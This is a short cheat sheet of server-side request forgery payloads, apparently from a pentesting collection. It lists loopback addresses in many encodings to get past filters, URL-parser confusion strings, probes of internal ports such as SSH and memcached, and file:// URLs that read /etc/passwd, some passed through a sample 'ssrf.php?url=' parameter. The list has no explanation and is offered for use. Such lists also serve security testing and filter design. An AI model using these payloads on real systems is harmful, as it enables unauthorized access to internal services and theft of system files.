## SSRF Payloads

```
http://127.0.0.1:80 
http://127.0.0.1:443 
http://127.0.0.1:22 
http://0.0.0.0:80 
http://0.0.0.0:443 
http://0.0.0.0:22 
http://localhost:80 
http://localhost:443 http://localhost:22 
http://[::]:80/ 
http://[::]:25/ 
http://[::]:22/ 
http://[::]:3128/ 
https://127.0.0.1/ 
https://localhost/ 
http://0000::1:80/ 
http://0000::1:25/ 
http://0000::1:22/ 
http://0000::1:3128/ 
http://127.127.127.127 
http://127.0.1.3 
http://127.0.0.0 
http://0177.0.0.1/ 
http://2130706433/ 
http://3232235521/ 
http://3232235777/ 
http://[0:0:0:0:0:ffff:127.0.0.1] 
localhost:+11211aaa 
localhost:00011211aaaa 
http://0/ 
http://127.1 
http://127.0.1 
http://127.1.1.1:80\@127.2.2.2:80/ 
http://127.1.1.1:80\@@127.2.2.2:80/ http://127.1.1.1:80:\@@127.2.2.2:80/ 
http://127.1.1.1:80#\@127.2.2.2:80/ 
ssrf.php?url=http://127.0.0.1:22 
ssrf.php?url=http://127.0.0.1:80 
ssrf.php?url=http://127.0.0.1:443 
file://path/to/file 
file:///etc/passwd 
file://\/\/etc/passwd 
ssrf.php?url=file:///etc/passwd

```
